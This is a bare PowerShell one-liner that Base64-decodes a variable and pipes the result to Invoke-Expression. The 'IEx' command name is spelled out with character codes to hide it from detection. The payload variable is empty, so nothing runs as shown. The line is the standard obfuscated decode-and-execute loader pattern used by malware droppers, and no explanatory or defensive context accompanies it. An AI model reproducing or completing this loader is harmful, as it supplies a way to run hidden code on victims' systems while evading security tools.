$TWYMQ="";$WWIULO=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($TWYMQ));$WWIULO|&([char]73+[char]69+[char]120)